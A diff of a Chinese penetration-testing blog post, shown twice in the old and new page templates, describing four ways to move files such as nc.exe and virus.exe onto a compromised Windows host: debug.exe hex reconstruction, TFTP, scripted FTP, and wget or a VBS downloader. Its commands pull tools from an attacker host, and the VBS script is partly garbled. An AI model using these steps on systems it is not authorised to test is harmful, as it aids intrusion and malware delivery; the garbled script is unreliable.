@@ -1,149 +1,446 @@
-<!DOCTYPE html>
-<html>
 
+ <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>渗透测试中上传文件到目标系统的四种姿势 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>渗透测试中上传文件到目标系统的四种姿势 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="&amp;#160;  #Windows 的 debug 方法  Windows 有一个程序叫 debug，这个程序可以将十六进制的机器码转换为可执行的文件。Windows 的 debug 方法可以先将文件转化为十六进制，然后通过非交互式 shell 在目标系统上 echo 出这个文件，最后使用 debug 转换十六进制并执行。Kali 里有一个名为 exe2bat 的程序位于 /usr/share/windows-binaries。  我们可以这样运行  root@kali:/usr/share/windows-binaries# wine exe2bat.exe nc.exe nc2.txt  Finished: nc.exe &amp;gt; nc2.txt  root@kali:/usr/share/windows-binaries#  这条命令会生成一个 txt 文档，其中内容类似如下：  echo 6e 76 69 72 6f 6e 6d 65 6e 74 53 74 72 69 6e 67 73 57 00 00 a3 00 47 65 74 43 50 49 6e 66 6f 00 9d 00 47 65 74 41 43 50 00 00 09 01 47 65 74 4f 45 4d 43 50 00 00 1e 00 43 6f 6d 70 61 72 65 53 74 72 69 6e 6$  echo e e780 &amp;gt;&amp;gt;123.hex  echo 6c 65 00 00 19 02 53 65 74 46 69 6c 65 50 6f 69 6e 74 65 72 00 00 2b 01 47 65 74 53 74 72 69 6e 67 54 79 70 65 41 00 00 2e 01 47 65 74 53 74 72 69 6e 67 54 79 70 65 57 00 00 16 01 47 65 74 50 72 6f 63 41 6$  echo e e800 &amp;gt;&amp;gt;123.hex  echo 47 65 74 4e 75 6d 62 65 72 4f 66 43 6f 6e 73 6f 6c 65 49 6e 70 75 74 45 76 65 6e 74 73 00 31 00 43 72 65 61 74 65 46 69 6c 65 41 00 10 02 53 65 74 45 6e 64 4f 66 46 69 6c 65 00 00 8d 01 4c 43 4d 61 70 53 7$  echo e e880 &amp;gt;&amp;gt;123.hex  echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0$  echo e e900 &amp;gt;&amp;gt;123.hex  echo &amp;gt;&amp;gt;123.hex  echo r cx &amp;gt;&amp;gt;123.hex  echo e800 &amp;gt;&amp;gt;123.hex  echo w &amp;gt;&amp;gt;123.hex  echo q &amp;gt;&amp;gt;123.hex  debug&amp;lt;123.hex  copy 1.dll nc.exe  之后我们要做的就是复制文档中所有的内容，粘贴到 Shell 窗口内即可。  0C96:E8E0 00.00 00.00 00.00 00.00 00.00 00.00 00.00 00.00  0C96:E8E8 00.00 00.00 00.00 00.00 00.00 00.00 00.00 00.00  0C96:E8F0 00.00 00.00 00.00 00.00 00.00 00.00 00.00 00.00  0C96:E8F8 00.00 00.00 00.00 00.00 00.00 00.00 00.00 00.00  0C96:E900 EC. 0E. AC.  -e e900  0C96:E900 EC.  EC 0E.e AC.ac  -r cx  CX 0000  :e800  -w  Writing 0E800 bytes  -q  C:\TRANSF~1&amp;gt;  这样我们的文件就出现在远程的目录里了。  21/10/2015 22:44 &amp;lt;DIR&amp;gt; .  21/10/2015 22:44 &amp;lt;DIR&amp;gt; ..  21/10/2015 22:44 59.392 1.DLL  21/10/2015 22:44 184.270 123.hex  21/10/2015 22:44 59.392 nc.exe">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="渗透测试中上传文件到目标系统的四种姿势 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="post-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+  <body>
+    <header>
+      <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/1134.seo/" title="渗透测试中上传文件到目标系统的四种姿势" itemprop="url">渗透测试中上传文件到目标系统的四种姿势</a>
+  </h1>
+  <!-- 显示作者
+  <p class="article-author">By
+    
+      <a href="http://ha.cker.in" title="Secer">Secer</a>
+    </p>
+  -->  
+  <p class="article-time">
+    <time datetime="2016-04-05T00:31:06.000Z" itemprop="datePublished">2016-04-05</time>
+    Updated:<time datetime="2016-08-20T11:03:54.000Z" itemprop="dateModified">2016-08-20</time>
+    
+  </p>
 </header>
 
-      
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+		</div>
+		
+		<p>&#160;</p>  <p><b>#Windows </b><b>的 debug 方法</b></p>  <p>Windows 有一个程序叫 debug，这个程序可以将十六进制的机器码转换为可执行的文件。Windows 的 debug 方法可以先将文件转化为十六进制，然后通过非交互式 shell 在目标系统上 echo 出这个文件，最后使用 debug 转换十六进制并执行。Kali 里有一个名为 exe2bat 的程序位于 /usr/share/windows-binaries。</p>  <p>我们可以这样运行</p>  <p>root@kali:/usr/share/windows-binaries# wine exe2bat.exe nc.exe nc2.txt</p>  <p>Finished: nc.exe &gt; nc2.txt</p>  <p>root@kali:/usr/share/windows-binaries#</p>  <p>这条命令会生成一个 txt 文档，其中内容类似如下：</p>  <p>echo 6e 76 69 72 6f 6e 6d 65 6e 74 53 74 72 69 6e 67 73 57 00 00 a3 00 47 65 74 43 50 49 6e 66 6f 00 9d 00 47 65 74 41 43 50 00 00 09 01 47 65 74 4f 45 4d 43 50 00 00 1e 00 43 6f 6d 70 61 72 65 53 74 72 69 6e 6$</p>  <p>echo e e780 &gt;&gt;123.hex</p>  <p>echo 6c 65 00 00 19 02 53 65 74 46 69 6c 65 50 6f 69 6e 74 65 72 00 00 2b 01 47 65 74 53 74 72 69 6e 67 54 79 70 65 41 00 00 2e 01 47 65 74 53 74 72 69 6e 67 54 79 70 65 57 00 00 16 01 47 65 74 50 72 6f 63 41 6$</p>  <p>echo e e800 &gt;&gt;123.hex</p>  <p>echo 47 65 74 4e 75 6d 62 65 72 4f 66 43 6f 6e 73 6f 6c 65 49 6e 70 75 74 45 76 65 6e 74 73 00 31 00 43 72 65 61 74 65 46 69 6c 65 41 00 10 02 53 65 74 45 6e 64 4f 66 46 69 6c 65 00 00 8d 01 4c 43 4d 61 70 53 7$</p>  <p>echo e e880 &gt;&gt;123.hex</p>  <p>echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0$</p>  <p>echo e e900 &gt;&gt;123.hex</p>  <p>echo &gt;&gt;123.hex</p>  <p>echo r cx &gt;&gt;123.hex</p>  <p>echo e800 &gt;&gt;123.hex</p>  <p>echo w &gt;&gt;123.hex</p>  <p>echo q &gt;&gt;123.hex</p>  <p>debug&lt;123.hex</p>  <p>copy 1.dll nc.exe</p>  <p>之后我们要做的就是复制文档中所有的内容，粘贴到 Shell 窗口内即可。</p>  <p>0<b>C96</b>:E8E0 00.00 00.00 00.00 00.00 00.00 00.00 00.00 00.00</p>  <p>0<b>C96</b>:E8E8 00.00 00.00 00.00 00.00 00.00 00.00 00.00 00.00</p>  <p>0<b>C96</b>:E8F0 00.00 00.00 00.00 00.00 00.00 00.00 00.00 00.00</p>  <p>0<b>C96</b>:E8F8 00.00 00.00 00.00 00.00 00.00 00.00 00.00 00.00</p>  <p>0<b>C96</b>:E900 <b>EC</b>. 0<b>E</b>. <b>AC</b>.</p>  <p><b>-e</b> <b>e900</b></p>  <p>0<b>C96</b>:E900 <b>EC</b>.</p>  <p><b>EC</b> 0<b>E</b>.e <b>AC</b>.ac</p>  <p><b>-r</b> <b>cx</b></p>  <p><b>CX</b> 0000</p>  <p>:e800</p>  <p><b>-w</b></p>  <p><b>Writing</b> 0<b>E800</b> <b>bytes</b></p>  <p><b>-q</b></p>  <p><b>C</b>:\<b>TRANSF</b>~1&gt;</p>  <p>这样我们的文件就出现在远程的目录里了。</p>  <p>21/10/2015 22:44 &lt;DIR&gt; .</p>  <p>21/10/2015 22:44 &lt;DIR&gt; ..</p>  <p>21/10/2015 22:44 59.392 1.DLL</p>  <p>21/10/2015 22:44 184.270 123.hex</p>  <p>21/10/2015 22:44 59.392 nc.exe</p><br><a id="more"></a><br><p><b>#TFTP </b><b>方法</b></p>  <p>TFTP 是一种使用 UDP 数据包在网络上两台机器间发送和接收数据的协议。它可以用来帮助攻击者向目标机器上传文件。注意，TFTP 使用的是 UDP数据包，所以不适合发送一些很大的文件，因为 UDP 缺少完整性校验的机制。</p>  <p>你可以安装一个轻量级 Python TFTP 服务端如下：</p>  <p># apt-get install git &amp;&amp; git clone git://github.com/msoulier/tftpy.git</p>  <p>随后创建一个用于存储上传文件的文件夹并使用 chmod 给予文件夹 777 的权限。之后就可以运行 TFTP 服务端了。</p>  <p># cd tftpy</p>  <p># python setup.py install</p>  <p>运行服务端</p>  <p># cd bin</p>  <p># python tftpy_server.py -r /你的文件夹</p>  <p>在目标机器上可以运行如下命令来获取想上传的文件。</p>  <p><b>C</b>:\<b>TRANSF</b>~1&gt;<b>tftp</b> <b>-i</b> 192.168.11.70 <b>get</b> <b>nc</b>.exe</p>  <p><b>tftp</b> <b>-i</b> 192.168.11.70 <b>get</b> <b>nc</b>.exe</p>  <p><b>C</b>:\<b>TRANSF</b>~1&gt;</p>  <p><b></b></p>  <p><b>#FTP </b><b>方法</b></p>  <p>另一个非常有用的上传文件的方法就是使用 FTP 服务器。由于 FTP 使用 TCP 传输数据，它会进行完整性校验，所以你可以上传较大的文件。我们可以在 Linux 系统上使用像 vsftpd 的 FTP 服务器。</p>  <p># apt-get install vsftpd</p>  <p>安装完 vsftpd 后，我们要编辑 /etcvsftpd.conf 文件，取消注释掉的 local_enable 和 write_enable，重启服务就可以上传文件了。</p>  <p>对于使用非交互式脚本在目标机器上传文件，我们仅需将下列命令一起写入 Shell 的窗口即可，下面我们假设 FTP 的用户名和密码都是 ftp。</p>  <p><b>C</b>:\<b>WINDOWS</b>\<b>system32</b>&gt;<b>echo</b> <b>open</b> 192.168.11.70 21&gt; <b>ftp</b>.txt</p>  <p><b>C</b>:\<b>WINDOWS</b>\<b>system32</b>&gt;<b>echo</b> <b>ftp</b>&gt;&gt; <b>ftp</b>.txt</p>  <p><b>C</b>:\<b>WINDOWS</b>\<b>system32</b>&gt;<b>echo</b> <b>bin</b> &gt;&gt; <b>ftp</b>.txt</p>  <p><b>C</b>:\<b>WINDOWS</b>\<b>system32</b>&gt;<b>echo</b> <b>ftp</b>&gt;&gt; <b>ftp</b>.txt</p>  <p><b>C</b>:\<b>WINDOWS</b>\<b>system32</b>&gt;<b>echo</b> <b>GET</b> <b>nc</b>.exe &gt;&gt; <b>ftp</b>.txt</p>  <p><b>C</b>:\<b>WINDOWS</b>\<b>system32</b>&gt;<b>echo</b> <b>bye</b> &gt;&gt; <b>ftp</b>.txt</p>  <p><b>C</b>:\<b>WINDOWS</b>\<b>system32</b>&gt;<b>ftp</b> <b>-s</b>:ftp.txt</p>  <p>这样文件就会出现在了目标系统上了。</p>  <p><b></b></p>  <p><b>#HTTP </b><b>方法</b></p>  <p>在渗透测试工作中我经常面对的目标主机是类 Unix系统，这时建立一个 HTTP 服务器并使用 wget 命令进行下载是一个非常简单的方法。Windows 系统上面没有原生的下载工具如 wget，不过在 Kali 的 /usr/share/windows-binaries 的目录下，有一个名为 wget.exe 的小工具可以在 windows 上执行 wget。</p>  <p>对于 HTTP 服务器我们可以选用 Apache2</p>  <p># apt-get install apache2</p>  <p>将文件移动到 /var/www 下面，并在目标系统上面运行 wget 如下。</p>  <p>C:\TRANSF~1&gt;wget.exe <a href="http://192.168.11.16/virus.exe" target="_blank" rel="external">http://192.168.11.16/virus.exe</a></p>  <p>wget.exe <a href="http://192.168.11.16/virus.exe" target="_blank" rel="external">http://192.168.11.16/virus.exe</a></p>  <p>–23:34:27– <a href="http://192.168.11.16/virus.exe" target="_blank" rel="external">http://192.168.11.16/virus.exe</a></p>  <p>=&gt; <code>virus.exe&#39;&lt;/p&gt;  &lt;p&gt;Connecting to 192.168.11.16:80… connected.&lt;/p&gt;  &lt;p&gt;HTTP request sent, awaiting response… 200 OK&lt;/p&gt;  &lt;p&gt;Length: 73,802 [application/x-msdos-program]&lt;/p&gt;  &lt;p&gt;0K ………. ………. ………. ………. ………. 69% 4.88 MB/s&lt;/p&gt;  &lt;p&gt;50K ………. ………. .. 100% 21.55 MB/s&lt;/p&gt;  &lt;p&gt;23:34:27 (7.04 MB/s) –</code>virus.exe’ saved [73802/73802]</p>  <p>C:\TRANSF~1&gt;</p>  <p>另一种让 wget 像 Windows 命令一样执行的方法是使用如下的脚本，这个非交互式脚本可以将内容简单的使用 echo 到文件中。</p>  <p>‘Barabas pure vbs downloader – tested on XP sp2</p>  <p>‘Microsoft</p>  <p>fixed</p>  <p>adodbstream</p>  <p>but</p>  <p>guess</p>  <p>what</p>  <p>&lt;img</p>  <p>includes/images/smilies/icon_smile.gif&quot; alt=&quot;:)&quot; <b>class</b>=&quot;wp-smiley&quot;&gt;</p>  <p>‘(c)dec 2004</p>  <p>‘First argument = complete url to download</p>  <p>‘Second Argument = filename you want to save</p>  <p>‘thnks to <a href="http://www.ericphelps.com/scripting/samples/BinaryDownload/" target="_blank" rel="external">http://www.ericphelps.com/scripting/samples/BinaryDownload/</a></p>  <p>‘</p>  <p>‘v2 – now includes proxy support <b>for</b> the winhttp request stuff</p>  <p>strUrl = WScript.Arguments.Item(0)</p>  <p>StrFile = WScript.Arguments.Item(1)</p>  <p>‘WinHttpRequest proxy settings.</p>  <p>Const HTTPREQUEST<em>PROXYSETTING</em></p>  <p>DEFAULT = 0</p>  <p>Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0</p>  <p>Const HTTPREQUEST_PROXYSETTING_DIRECT = 1</p>  <p>Const HTTPREQUEST_PROXYSETTING_PROXY = 2</p>  <p>219</p>  <p>src=&quot;<a href="http://s.wordpress.com/wp-Dim" target="_blank" rel="external">http://s.wordpress.com/wp-Dim</a> http, varByteArray, strData, strBuffer, lngCounter, fs, ts</p>  <p>Err.Clear</p>  <p>Set http = Nothing</p>  <p>Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;)</p>  <p>If http Is Nothing Then Set http =</p>  <p>CreateObject(&quot;WinHttp.WinHttpRequest&quot;)</p>  <p>If http Is Nothing Then Set http =</p>  <p>CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;)</p>  <p>If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;)</p>  <p>‘ comment out next line <b>if</b> no proxy is being used</p>  <p>‘ and change the proxy to suit ur needs -duh</p>  <p>http.SetProxy HTTPREQUEST_PROXYSETTING_PROXY, &quot;web-proxy:80&quot;</p>  <p>http.Open &quot;GET&quot;, strURL, False</p>  <p>http.Send</p>  <p>varByteArray = http.ResponseBody</p>  <p>Set http = Nothing</p>  <p>strBuffer = &quot;&quot;</p>  <p>strData = &quot;&quot;</p>  <p>Set ts = fs.CreateTextFile(StrFile, True)</p>  <p>Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;)</p>  <p>For lngCounter = 0 to UBound(varByteArray)</p>  <p>ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))</p>  <p>Next</p>  <p>ts.Close</p>  <p><b></b></p>  <p><b>*</b><b>原文：<a href="http://ly0n.me/2015/10/21/uploading-files-to-compromised-systems/" target="_blank" rel="external">ly0n</a>，FB小编xiaix编译，转自须注明来自FreeBuf黑客与极客（FreeBuf.COM）</b></p>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-share" id="share">
 
-<main class="content" role="main">
-  <article class="post">
-    <span class="post-meta">
-      <time datetime="2016-04-05T00:31:06.000Z" itemprop="datePublished">
-          2016-04-05
-      </time>
-    
-    
-    | 
-    <a href='/tag/渗透测试/'>渗透测试</a>
-    
-    
-</span>
-    <h1 class="post-title">渗透测试中上传文件到目标系统的四种姿势</h1>
-    <section class="post-content">
-      <p>&#160;</p>  <p><b>#Windows </b><b>的 debug 方法</b></p>  <p>Windows 有一个程序叫 debug，这个程序可以将十六进制的机器码转换为可执行的文件。Windows 的 debug 方法可以先将文件转化为十六进制，然后通过非交互式 shell 在目标系统上 echo 出这个文件，最后使用 debug 转换十六进制并执行。Kali 里有一个名为 exe2bat 的程序位于 /usr/share/windows-binaries。</p>  <p>我们可以这样运行</p>  <p>root@kali:/usr/share/windows-binaries# wine exe2bat.exe nc.exe nc2.txt</p>  <p>Finished: nc.exe &gt; nc2.txt</p>  <p>root@kali:/usr/share/windows-binaries#</p>  <p>这条命令会生成一个 txt 文档，其中内容类似如下：</p>  <p>echo 6e 76 69 72 6f 6e 6d 65 6e 74 53 74 72 69 6e 67 73 57 00 00 a3 00 47 65 74 43 50 49 6e 66 6f 00 9d 00 47 65 74 41 43 50 00 00 09 01 47 65 74 4f 45 4d 43 50 00 00 1e 00 43 6f 6d 70 61 72 65 53 74 72 69 6e 6$</p>  <p>echo e e780 &gt;&gt;123.hex</p>  <p>echo 6c 65 00 00 19 02 53 65 74 46 69 6c 65 50 6f 69 6e 74 65 72 00 00 2b 01 47 65 74 53 74 72 69 6e 67 54 79 70 65 41 00 00 2e 01 47 65 74 53 74 72 69 6e 67 54 79 70 65 57 00 00 16 01 47 65 74 50 72 6f 63 41 6$</p>  <p>echo e e800 &gt;&gt;123.hex</p>  <p>echo 47 65 74 4e 75 6d 62 65 72 4f 66 43 6f 6e 73 6f 6c 65 49 6e 70 75 74 45 76 65 6e 74 73 00 31 00 43 72 65 61 74 65 46 69 6c 65 41 00 10 02 53 65 74 45 6e 64 4f 66 46 69 6c 65 00 00 8d 01 4c 43 4d 61 70 53 7$</p>  <p>echo e e880 &gt;&gt;123.hex</p>  <p>echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0$</p>  <p>echo e e900 &gt;&gt;123.hex</p>  <p>echo &gt;&gt;123.hex</p>  <p>echo r cx &gt;&gt;123.hex</p>  <p>echo e800 &gt;&gt;123.hex</p>  <p>echo w &gt;&gt;123.hex</p>  <p>echo q &gt;&gt;123.hex</p>  <p>debug&lt;123.hex</p>  <p>copy 1.dll nc.exe</p>  <p>之后我们要做的就是复制文档中所有的内容，粘贴到 Shell 窗口内即可。</p>  <p>0<b>C96</b>:E8E0 00.00 00.00 00.00 00.00 00.00 00.00 00.00 00.00</p>  <p>0<b>C96</b>:E8E8 00.00 00.00 00.00 00.00 00.00 00.00 00.00 00.00</p>  <p>0<b>C96</b>:E8F0 00.00 00.00 00.00 00.00 00.00 00.00 00.00 00.00</p>  <p>0<b>C96</b>:E8F8 00.00 00.00 00.00 00.00 00.00 00.00 00.00 00.00</p>  <p>0<b>C96</b>:E900 <b>EC</b>. 0<b>E</b>. <b>AC</b>.</p>  <p><b>-e</b> <b>e900</b></p>  <p>0<b>C96</b>:E900 <b>EC</b>.</p>  <p><b>EC</b> 0<b>E</b>.e <b>AC</b>.ac</p>  <p><b>-r</b> <b>cx</b></p>  <p><b>CX</b> 0000</p>  <p>:e800</p>  <p><b>-w</b></p>  <p><b>Writing</b> 0<b>E800</b> <b>bytes</b></p>  <p><b>-q</b></p>  <p><b>C</b>:\<b>TRANSF</b>~1&gt;</p>  <p>这样我们的文件就出现在远程的目录里了。</p>  <p>21/10/2015 22:44 &lt;DIR&gt; .</p>  <p>21/10/2015 22:44 &lt;DIR&gt; ..</p>  <p>21/10/2015 22:44 59.392 1.DLL</p>  <p>21/10/2015 22:44 184.270 123.hex</p>  <p>21/10/2015 22:44 59.392 nc.exe</p><br><a id="more"></a><br><p><b>#TFTP </b><b>方法</b></p>  <p>TFTP 是一种使用 UDP 数据包在网络上两台机器间发送和接收数据的协议。它可以用来帮助攻击者向目标机器上传文件。注意，TFTP 使用的是 UDP数据包，所以不适合发送一些很大的文件，因为 UDP 缺少完整性校验的机制。</p>  <p>你可以安装一个轻量级 Python TFTP 服务端如下：</p>  <p># apt-get install git &amp;&amp; git clone git://github.com/msoulier/tftpy.git</p>  <p>随后创建一个用于存储上传文件的文件夹并使用 chmod 给予文件夹 777 的权限。之后就可以运行 TFTP 服务端了。</p>  <p># cd tftpy</p>  <p># python setup.py install</p>  <p>运行服务端</p>  <p># cd bin</p>  <p># python tftpy_server.py -r /你的文件夹</p>  <p>在目标机器上可以运行如下命令来获取想上传的文件。</p>  <p><b>C</b>:\<b>TRANSF</b>~1&gt;<b>tftp</b> <b>-i</b> 192.168.11.70 <b>get</b> <b>nc</b>.exe</p>  <p><b>tftp</b> <b>-i</b> 192.168.11.70 <b>get</b> <b>nc</b>.exe</p>  <p><b>C</b>:\<b>TRANSF</b>~1&gt;</p>  <p><b></b></p>  <p><b>#FTP </b><b>方法</b></p>  <p>另一个非常有用的上传文件的方法就是使用 FTP 服务器。由于 FTP 使用 TCP 传输数据，它会进行完整性校验，所以你可以上传较大的文件。我们可以在 Linux 系统上使用像 vsftpd 的 FTP 服务器。</p>  <p># apt-get install vsftpd</p>  <p>安装完 vsftpd 后，我们要编辑 /etcvsftpd.conf 文件，取消注释掉的 local_enable 和 write_enable，重启服务就可以上传文件了。</p>  <p>对于使用非交互式脚本在目标机器上传文件，我们仅需将下列命令一起写入 Shell 的窗口即可，下面我们假设 FTP 的用户名和密码都是 ftp。</p>  <p><b>C</b>:\<b>WINDOWS</b>\<b>system32</b>&gt;<b>echo</b> <b>open</b> 192.168.11.70 21&gt; <b>ftp</b>.txt</p>  <p><b>C</b>:\<b>WINDOWS</b>\<b>system32</b>&gt;<b>echo</b> <b>ftp</b>&gt;&gt; <b>ftp</b>.txt</p>  <p><b>C</b>:\<b>WINDOWS</b>\<b>system32</b>&gt;<b>echo</b> <b>bin</b> &gt;&gt; <b>ftp</b>.txt</p>  <p><b>C</b>:\<b>WINDOWS</b>\<b>system32</b>&gt;<b>echo</b> <b>ftp</b>&gt;&gt; <b>ftp</b>.txt</p>  <p><b>C</b>:\<b>WINDOWS</b>\<b>system32</b>&gt;<b>echo</b> <b>GET</b> <b>nc</b>.exe &gt;&gt; <b>ftp</b>.txt</p>  <p><b>C</b>:\<b>WINDOWS</b>\<b>system32</b>&gt;<b>echo</b> <b>bye</b> &gt;&gt; <b>ftp</b>.txt</p>  <p><b>C</b>:\<b>WINDOWS</b>\<b>system32</b>&gt;<b>ftp</b> <b>-s</b>:ftp.txt</p>  <p>这样文件就会出现在了目标系统上了。</p>  <p><b></b></p>  <p><b>#HTTP </b><b>方法</b></p>  <p>在渗透测试工作中我经常面对的目标主机是类 Unix系统，这时建立一个 HTTP 服务器并使用 wget 命令进行下载是一个非常简单的方法。Windows 系统上面没有原生的下载工具如 wget，不过在 Kali 的 /usr/share/windows-binaries 的目录下，有一个名为 wget.exe 的小工具可以在 windows 上执行 wget。</p>  <p>对于 HTTP 服务器我们可以选用 Apache2</p>  <p># apt-get install apache2</p>  <p>将文件移动到 /var/www 下面，并在目标系统上面运行 wget 如下。</p>  <p>C:\TRANSF~1&gt;wget.exe <a href="http://192.168.11.16/virus.exe" target="_blank" rel="external">http://192.168.11.16/virus.exe</a></p>  <p>wget.exe <a href="http://192.168.11.16/virus.exe" target="_blank" rel="external">http://192.168.11.16/virus.exe</a></p>  <p>–23:34:27– <a href="http://192.168.11.16/virus.exe" target="_blank" rel="external">http://192.168.11.16/virus.exe</a></p>  <p>=&gt; <code>virus.exe&#39;&lt;/p&gt;  &lt;p&gt;Connecting to 192.168.11.16:80… connected.&lt;/p&gt;  &lt;p&gt;HTTP request sent, awaiting response… 200 OK&lt;/p&gt;  &lt;p&gt;Length: 73,802 [application/x-msdos-program]&lt;/p&gt;  &lt;p&gt;0K ………. ………. ………. ………. ………. 69% 4.88 MB/s&lt;/p&gt;  &lt;p&gt;50K ………. ………. .. 100% 21.55 MB/s&lt;/p&gt;  &lt;p&gt;23:34:27 (7.04 MB/s) –</code>virus.exe’ saved [73802/73802]</p>  <p>C:\TRANSF~1&gt;</p>  <p>另一种让 wget 像 Windows 命令一样执行的方法是使用如下的脚本，这个非交互式脚本可以将内容简单的使用 echo 到文件中。</p>  <p>‘Barabas pure vbs downloader – tested on XP sp2</p>  <p>‘Microsoft</p>  <p>fixed</p>  <p>adodbstream</p>  <p>but</p>  <p>guess</p>  <p>what</p>  <p>&lt;img</p>  <p>includes/images/smilies/icon_smile.gif&quot; alt=&quot;:)&quot; <b>class</b>=&quot;wp-smiley&quot;&gt;</p>  <p>‘(c)dec 2004</p>  <p>‘First argument = complete url to download</p>  <p>‘Second Argument = filename you want to save</p>  <p>‘thnks to <a href="http://www.ericphelps.com/scripting/samples/BinaryDownload/" target="_blank" rel="external">http://www.ericphelps.com/scripting/samples/BinaryDownload/</a></p>  <p>‘</p>  <p>‘v2 – now includes proxy support <b>for</b> the winhttp request stuff</p>  <p>strUrl = WScript.Arguments.Item(0)</p>  <p>StrFile = WScript.Arguments.Item(1)</p>  <p>‘WinHttpRequest proxy settings.</p>  <p>Const HTTPREQUEST<em>PROXYSETTING</em></p>  <p>DEFAULT = 0</p>  <p>Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0</p>  <p>Const HTTPREQUEST_PROXYSETTING_DIRECT = 1</p>  <p>Const HTTPREQUEST_PROXYSETTING_PROXY = 2</p>  <p>219</p>  <p>src=&quot;<a href="http://s.wordpress.com/wp-Dim" target="_blank" rel="external">http://s.wordpress.com/wp-Dim</a> http, varByteArray, strData, strBuffer, lngCounter, fs, ts</p>  <p>Err.Clear</p>  <p>Set http = Nothing</p>  <p>Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;)</p>  <p>If http Is Nothing Then Set http =</p>  <p>CreateObject(&quot;WinHttp.WinHttpRequest&quot;)</p>  <p>If http Is Nothing Then Set http =</p>  <p>CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;)</p>  <p>If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;)</p>  <p>‘ comment out next line <b>if</b> no proxy is being used</p>  <p>‘ and change the proxy to suit ur needs -duh</p>  <p>http.SetProxy HTTPREQUEST_PROXYSETTING_PROXY, &quot;web-proxy:80&quot;</p>  <p>http.Open &quot;GET&quot;, strURL, False</p>  <p>http.Send</p>  <p>varByteArray = http.ResponseBody</p>  <p>Set http = Nothing</p>  <p>strBuffer = &quot;&quot;</p>  <p>strData = &quot;&quot;</p>  <p>Set ts = fs.CreateTextFile(StrFile, True)</p>  <p>Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;)</p>  <p>For lngCounter = 0 to UBound(varByteArray)</p>  <p>ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))</p>  <p>Next</p>  <p>ts.Close</p>  <p><b></b></p>  <p><b>*</b><b>原文：<a href="http://ly0n.me/2015/10/21/uploading-files-to-compromised-systems/" target="_blank" rel="external">ly0n</a>，FB小编xiaix编译，转自须注明来自FreeBuf黑客与极客（FreeBuf.COM）</b></p>
-    </section>
-    <footer class="post-footer">
-      <section class="author">
-    <h4>Secer</h4>
